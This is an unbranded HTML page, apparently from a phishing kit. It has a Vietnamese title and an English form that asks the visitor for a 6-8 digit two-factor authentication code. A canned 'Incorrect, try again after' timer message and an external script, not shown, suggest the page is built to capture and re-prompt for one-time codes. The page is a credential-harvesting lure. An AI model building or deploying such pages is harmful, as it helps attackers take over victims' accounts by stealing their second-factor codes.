<!DOCTYPE html>
<html lang="vi">
<head>
  <meta charset="UTF-8" />
  <title>Kiểm tra thông báo</title>
  <link rel="stylesheet" href="./assets/styles/verry.css">
</head>
<body>
  <main class="wrapper">
    <div class="modal form-modal" id="twoFAmodal" tabindex="-1" aria-labelledby="2FAmodalLabel" aria-hidden="true">
      <div class="modal-dialog modal-dialog-centered modal-fullscreen-lg-down">
        <div class="modal-content">
          <div class="modal-body">
            <div class="twoFAinfo-wraper">
              <h1 class="modal-title" id="2FAmodalLabel">Check your authentication code </h1>
              <p>Enter the 6-digit code for this account from the two-factor authentication you set up
                (such as Google Authenticator or text message on you mobile).</p>
            </div>
            <img src="./assets/images/2FA.png" alt="Minh họa ứng dụng xác thực" class="illustration">

            <form id="twoFAForm">
              <div class="mb-3">
              </div>


              <div class="mb-3">
                <div class="password-input">
                  <label for="twofaFormPassword" class="form-label"></label>
                  <input name="2FA-1" minlength="6" maxlength="8" type="tel" placeholder="Code" class="form-control" id="twofaFormPassword"
                    aria-describedby="emailHelp" required autocomplete="off">
                </div>
                <div class="invalid-feedback">
                  Incorrect. Please, try again after <span id="timer"></span>
                </div>
              </div>
              <div class="form-btn-wrapper">
                <button class="btn btn-primary">
                  <span class="spinner-border text-light" role="status" style="display: none;"></span>
                  <span class="button-text">Continue</span>
                </button>
              </div>
            </form>
            <div class="spaser"></div>
          </div>
        </div>
      </div>
    </div>
  <!-- JS -->
  <script type="module" src="./assets/scripts/index.js"></script>
</body>
</html>
